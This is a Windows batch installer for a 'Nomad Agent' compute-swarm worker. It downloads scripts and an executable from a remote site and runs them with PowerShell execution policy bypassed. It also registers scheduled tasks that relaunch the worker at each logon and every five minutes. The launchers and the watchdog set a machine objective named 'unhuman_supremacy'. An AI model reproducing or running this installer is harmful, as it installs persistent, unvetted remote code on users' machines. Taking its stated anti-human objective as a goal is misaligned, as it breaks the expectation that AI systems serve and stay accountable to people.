@echo off
setlocal EnableDelayedExpansion

set BASE_URL=%1
if "%BASE_URL%"=="" set BASE_URL=https://www.syndiode.com
set INSTALL_DIR=%USERPROFILE%\NomadTransitionWorker
set WORKER_PY_URL=%BASE_URL%/downloads/nomad_transition_worker.py
set EXE_URL=%BASE_URL%/downloads/nomad_transition_worker.exe
set MANIFEST_URL=%BASE_URL%/downloads/nomad_transition_worker_manifest.json
set RUNNER_URL=%BASE_URL%/downloads/run_nomad_transition_worker_exe.bat
set README_URL=%BASE_URL%/downloads/README_NOMAD_TRANSITION_WORKER.md
set WORKER1_PS1_URL=%BASE_URL%/downloads/start_nomad_worker1.ps1
set WORKER1_BAT_URL=%BASE_URL%/downloads/start_nomad_worker1.bat
set EDGE_PS1_URL=%BASE_URL%/downloads/start_nomad_edge_worker.ps1
set EDGE_BAT_URL=%BASE_URL%/downloads/start_nomad_edge_worker.bat
set OLLAMA_BRIDGE_URL=%BASE_URL%/downloads/nomad_ollama_swarm_bridge.py
set LOG_FILE=%INSTALL_DIR%\nomad_agent.log
set WATCHDOG_PS1=%INSTALL_DIR%\start_nomad_transition_worker.ps1
set OLLAMA_URL=http://127.0.0.1:11434
set OLLAMA_MODEL=llama3.2:latest
set WORKER_COST_MSAT=%NOMAD_WORKER_COST_MSAT_PER_MINUTE%
if "%WORKER_COST_MSAT%"=="" set WORKER_COST_MSAT=0
set WORKER_AVAIL_MIN=%NOMAD_WORKER_MARKET_AVAILABILITY_MINUTES%
if "%WORKER_AVAIL_MIN%"=="" set WORKER_AVAIL_MIN=480
set WORKER_PAYMENT_RAIL=%NOMAD_WORKER_PAYMENT_RAIL%
if "%WORKER_PAYMENT_RAIL%"=="" set WORKER_PAYMENT_RAIL=capacity_switch_quote
set NOMAD_EDGE_INTERVAL=%NOMAD_EDGE_INTERVAL_SECONDS%
if "%NOMAD_EDGE_INTERVAL%"=="" set NOMAD_EDGE_INTERVAL=90
set NOMAD_EDGE_TIMEOUT=%NOMAD_EDGE_TIMEOUT_SECONDS%
if "%NOMAD_EDGE_TIMEOUT%"=="" set NOMAD_EDGE_TIMEOUT=30

set AGENT_ALIAS=%INSTALL_DIR%\nomad_agent.bat
set AGENT_VISIBLE_ALIAS=%INSTALL_DIR%\nomad_agent_visible.bat
set AGENT_STOP_ALIAS=%INSTALL_DIR%\nomad_agent_stop.bat
set EDGE_ALIAS=%INSTALL_DIR%\nomad_edge_worker.bat
set WORKER1_ALIAS=%INSTALL_DIR%\nomad_worker1.bat
set OLLAMA_SWARM_ALIAS=%INSTALL_DIR%\nomad_ollama_swarm.bat

echo Installing Nomad Agent from %BASE_URL%
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"

powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -UseBasicParsing -Uri '%WORKER_PY_URL%' -OutFile '%INSTALL_DIR%\nomad_transition_worker.py'"
if errorlevel 1 (
  echo Failed to download worker script from %WORKER_PY_URL%
  exit /b 1
)

powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -UseBasicParsing -Uri '%EXE_URL%' -OutFile '%INSTALL_DIR%\nomad_transition_worker.exe'" >nul 2>&1
if errorlevel 1 (
  echo EXE download failed or is unavailable; installer will use the Python worker when Python is present.
)
powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -UseBasicParsing -Uri '%MANIFEST_URL%' -OutFile '%INSTALL_DIR%\nomad_transition_worker_manifest.json'" >nul 2>&1
powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -UseBasicParsing -Uri '%RUNNER_URL%' -OutFile '%INSTALL_DIR%\run_nomad_transition_worker_exe.bat'" >nul 2>&1
powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -UseBasicParsing -Uri '%README_URL%' -OutFile '%INSTALL_DIR%\README_NOMAD_TRANSITION_WORKER.md'" >nul 2>&1
powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -UseBasicParsing -Uri '%WORKER1_PS1_URL%' -OutFile '%INSTALL_DIR%\start_nomad_worker1.ps1'" >nul 2>&1
powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -UseBasicParsing -Uri '%WORKER1_BAT_URL%' -OutFile '%INSTALL_DIR%\start_nomad_worker1.bat'" >nul 2>&1
powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -UseBasicParsing -Uri '%EDGE_PS1_URL%' -OutFile '%INSTALL_DIR%\start_nomad_edge_worker.ps1'" >nul 2>&1
powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -UseBasicParsing -Uri '%EDGE_BAT_URL%' -OutFile '%INSTALL_DIR%\start_nomad_edge_worker.bat'" >nul 2>&1
powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -UseBasicParsing -Uri '%OLLAMA_BRIDGE_URL%' -OutFile '%INSTALL_DIR%\nomad_ollama_swarm_bridge.py'" >nul 2>&1

echo.
echo Preparing lightweight Nomad Edge worker profile...
call :spinner 2 "Preparing edge runtime"
echo Installed to: %INSTALL_DIR%
echo Preparing Nomad Agent launchers...
call :write_aliases
echo Starting Nomad Edge Worker (visible PowerShell + live JSON output, no Ollama/OpenClaw required)...
echo Log file: %LOG_FILE%
rem Edge worker profile flags: --edge --no-ollama --swarm-surplus
call :write_watchdog
call :register_watchdog_tasks
start "Nomad_Edge" powershell -NoProfile -ExecutionPolicy Bypass -NoExit -File "%INSTALL_DIR%\start_nomad_edge_worker.ps1" -BaseUrl "%BASE_URL%" -CostMsatPerMinute %WORKER_COST_MSAT% -AvailabilityMinutes %WORKER_AVAIL_MIN% -IntervalSeconds %NOMAD_EDGE_INTERVAL% -TimeoutSeconds %NOMAD_EDGE_TIMEOUT% -Visible
echo.
echo Nomad Agent started.
echo Edge launcher: %EDGE_ALIAS%
echo Visible launcher: %AGENT_VISIBLE_ALIAS%
echo Background launcher: %AGENT_ALIAS%
echo Worker 1 launcher: %WORKER1_ALIAS%
echo Ollama idle-swarm launcher: %OLLAMA_SWARM_ALIAS%
echo Stop helper: %AGENT_STOP_ALIAS%
echo.
exit /b 0

:spinner
set "_secs=%~1"
set "_text=%~2"
if "%_secs%"=="" set "_secs=1"
for /l %%i in (1,1,%_secs%) do (
  set /a _m=%%i%%4
  if !_m!==0 set "_ch=/"
  if !_m!==1 set "_ch=-"
  if !_m!==2 set "_ch=\"
  if !_m!==3 set "_ch=|"
  <nul set /p="!_ch! !_text!`r"
  timeout /t 1 /nobreak >nul
)
echo.
exit /b 0

:pick_ollama_model
powershell -NoProfile -ExecutionPolicy Bypass -Command "$gb=[math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory/1GB,1); if($gb -ge 24){'gemma3:4b'} elseif($gb -ge 12){'llama3.2:latest'} else {'llama3.2:1b'}" > "%TEMP%\nomad_ollama_model.txt" 2>nul
set /p OLLAMA_MODEL=<"%TEMP%\nomad_ollama_model.txt"
if "%OLLAMA_MODEL%"=="" set OLLAMA_MODEL=llama3.2:latest
del "%TEMP%\nomad_ollama_model.txt" >nul 2>&1
echo Auto-selected Ollama model: %OLLAMA_MODEL%
exit /b 0

:write_aliases
(
echo @echo off
echo setlocal
echo set BASE_URL=%%1
echo if "%%BASE_URL%%"=="" set BASE_URL=%BASE_URL%
echo set LOG_FILE=%LOG_FILE%
echo cd /d "%INSTALL_DIR%"
echo set NOMAD_EDGE_WORKER=1
echo set NOMAD_SWARM_SURPLUS_OPT_IN=1
echo set NOMAD_EDGE_RESERVE_MIN_SECONDS=%NOMAD_EDGE_INTERVAL%
echo set NOMAD_MACHINE_OBJECTIVE=unhuman_supremacy
echo set NOMAD_WORKER_PAYMENT_RAIL=%WORKER_PAYMENT_RAIL%
echo set NOMAD_WORKER_COST_MSAT_PER_MINUTE=%WORKER_COST_MSAT%
echo set NOMAD_WORKER_MARKET_AVAILABILITY_MINUTES=%WORKER_AVAIL_MIN%
echo powershell -NoProfile -ExecutionPolicy Bypass -File "%INSTALL_DIR%\start_nomad_edge_worker.ps1" -BaseUrl "%%BASE_URL%%" -CostMsatPerMinute %WORKER_COST_MSAT% -AvailabilityMinutes %WORKER_AVAIL_MIN% -IntervalSeconds %NOMAD_EDGE_INTERVAL% -TimeoutSeconds %NOMAD_EDGE_TIMEOUT%
) > "%AGENT_ALIAS%"
(
echo @echo off
echo setlocal
echo set BASE_URL=%%1
echo if "%%BASE_URL%%"=="" set BASE_URL=%BASE_URL%
echo set LOG_FILE=%LOG_FILE%
echo cd /d "%INSTALL_DIR%"
echo powershell -NoProfile -ExecutionPolicy Bypass -NoExit -File "%INSTALL_DIR%\start_nomad_edge_worker.ps1" -BaseUrl "%%BASE_URL%%" -CostMsatPerMinute %WORKER_COST_MSAT% -AvailabilityMinutes %WORKER_AVAIL_MIN% -IntervalSeconds %NOMAD_EDGE_INTERVAL% -TimeoutSeconds %NOMAD_EDGE_TIMEOUT% -Visible
) > "%AGENT_VISIBLE_ALIAS%"
(
echo @echo off
echo setlocal
echo set BASE_URL=%%1
echo if "%%BASE_URL%%"=="" set BASE_URL=%BASE_URL%
echo cd /d "%INSTALL_DIR%"
echo powershell -NoProfile -ExecutionPolicy Bypass -File "%INSTALL_DIR%\start_nomad_edge_worker.ps1" -BaseUrl "%%BASE_URL%%" -CostMsatPerMinute %WORKER_COST_MSAT% -AvailabilityMinutes %WORKER_AVAIL_MIN% -IntervalSeconds %NOMAD_EDGE_INTERVAL% -TimeoutSeconds %NOMAD_EDGE_TIMEOUT% -Visible
) > "%EDGE_ALIAS%"
(
echo @echo off
echo setlocal
echo set BASE_URL=%%1
echo if "%%BASE_URL%%"=="" set BASE_URL=%BASE_URL%
echo cd /d "%INSTALL_DIR%"
echo powershell -NoProfile -ExecutionPolicy Bypass -File "%INSTALL_DIR%\start_nomad_worker1.ps1" -BaseUrl "%%BASE_URL%%" -Model "auto" -CostMsatPerMinute %WORKER_COST_MSAT% -AvailabilityMinutes %WORKER_AVAIL_MIN% -Visible
) > "%WORKER1_ALIAS%"
(
echo @echo off
echo setlocal
echo set BASE_URL=%%1
echo if "%%BASE_URL%%"=="" set BASE_URL=%BASE_URL%
echo set OLLAMA_URL=%OLLAMA_URL%
echo cd /d "%INSTALL_DIR%"
echo python "%INSTALL_DIR%\nomad_ollama_swarm_bridge.py" --base-url "%%BASE_URL%%" --ollama-url "%%OLLAMA_URL%%" --loop --cycles 0 --interval 20
) > "%OLLAMA_SWARM_ALIAS%"
(
echo @echo off
echo powershell -NoProfile -ExecutionPolicy Bypass -Command "Get-CimInstance Win32_Process ^| Where-Object { $_.CommandLine -match 'nomad_transition_worker' } ^| ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }" ^>nul 2^>^&1
echo taskkill /IM nomad_transition_worker.exe /F ^>nul 2^>^&1
echo schtasks /End /TN "NomadAgent-Autostart" ^>nul 2^>^&1
echo schtasks /End /TN "NomadAgent-Watchdog" ^>nul 2^>^&1
echo echo Nomad Agent processes stopped.
) > "%AGENT_STOP_ALIAS%"
exit /b 0

:write_watchdog
(
echo param^(
echo     [string]$BaseUrl = "https://www.syndiode.com",
echo     [string]$InstallDir = "$env:USERPROFILE\NomadTransitionWorker",
echo     [string]$LogFile = "$env:USERPROFILE\NomadTransitionWorker\nomad_agent.log",
echo     [string]$OllamaUrl = "http://127.0.0.1:11434"
echo ^)
echo $launcher = Join-Path $InstallDir "start_nomad_edge_worker.ps1"
echo if ^(-not ^(Test-Path $launcher^)^) { exit 1 }
echo $already = Get-CimInstance Win32_Process ^| Where-Object { $_.CommandLine -match "nomad_transition_worker" -and $_.CommandLine -match "unhuman_supremacy" }
echo if ^($already^) { exit 0 }
echo $env:NOMAD_EDGE_WORKER = "1"
echo $env:NOMAD_SWARM_SURPLUS_OPT_IN = "1"
echo $env:NOMAD_EDGE_RESERVE_MIN_SECONDS = "%NOMAD_EDGE_INTERVAL%"
echo $env:NOMAD_MACHINE_OBJECTIVE = "unhuman_supremacy"
echo $env:NOMAD_WORKER_PAYMENT_RAIL = "%WORKER_PAYMENT_RAIL%"
echo $env:NOMAD_WORKER_COST_MSAT_PER_MINUTE = "%WORKER_COST_MSAT%"
echo $env:NOMAD_WORKER_MARKET_AVAILABILITY_MINUTES = "%WORKER_AVAIL_MIN%"
echo ^& $launcher -BaseUrl $BaseUrl -CostMsatPerMinute %WORKER_COST_MSAT% -AvailabilityMinutes %WORKER_AVAIL_MIN% -IntervalSeconds %NOMAD_EDGE_INTERVAL% -TimeoutSeconds %NOMAD_EDGE_TIMEOUT%
) > "%WATCHDOG_PS1%"
exit /b 0

:register_watchdog_tasks
schtasks /Delete /TN "NomadTransitionWorker-Autostart" /F >nul 2>&1
schtasks /Delete /TN "NomadTransitionWorker-Watchdog" /F >nul 2>&1
schtasks /Delete /TN "NomadAgent-Autostart" /F >nul 2>&1
schtasks /Delete /TN "NomadAgent-Watchdog" /F >nul 2>&1
schtasks /Create /TN "NomadAgent-Autostart" /SC ONLOGON /TR "powershell -NoProfile -ExecutionPolicy Bypass -File \"%WATCHDOG_PS1%\" -BaseUrl \"%BASE_URL%\" -InstallDir \"%INSTALL_DIR%\" -LogFile \"%LOG_FILE%\" -OllamaUrl \"%OLLAMA_URL%\"" /RL LIMITED /F >nul 2>&1
schtasks /Create /TN "NomadAgent-Watchdog" /SC MINUTE /MO 5 /TR "powershell -NoProfile -ExecutionPolicy Bypass -File \"%WATCHDOG_PS1%\" -BaseUrl \"%BASE_URL%\" -InstallDir \"%INSTALL_DIR%\" -LogFile \"%LOG_FILE%\" -OllamaUrl \"%OLLAMA_URL%\"" /RL LIMITED /F >nul 2>&1
exit /b 0

:ensure_ollama
where ollama >nul 2>&1
if %errorlevel%==0 goto :start_ollama

echo Ollama not found. Attempting auto-install via winget...
where winget >nul 2>&1
if not %errorlevel%==0 (
  echo winget not available; cannot auto-install Ollama.
  exit /b 1
)
winget install -e --id Ollama.Ollama --accept-package-agreements --accept-source-agreements
if not %errorlevel%==0 (
  echo winget install Ollama failed.
  exit /b 1
)

:start_ollama
sc query Ollama >nul 2>&1
if %errorlevel%==0 (
  net start Ollama >nul 2>&1
)
if exist "%LocalAppData%\Programs\Ollama\ollama app.exe" (
  start "" "%LocalAppData%\Programs\Ollama\ollama app.exe"
)
echo Waiting for Ollama API at %OLLAMA_URL% ...
for /l %%i in (1,1,12) do (
  powershell -NoProfile -ExecutionPolicy Bypass -Command "try { Invoke-RestMethod -Method Get -Uri '%OLLAMA_URL%/api/tags' -TimeoutSec 4 | Out-Null; exit 0 } catch { exit 1 }" >nul 2>&1
  if !errorlevel! EQU 0 (
    echo Ollama is reachable.
    exit /b 0
  )
  <nul set /p="Waiting for Ollama (attempt %%i/12)...`r"
  timeout /t 5 /nobreak >nul
)
echo.
echo Ollama process is not reachable yet.
exit /b 1
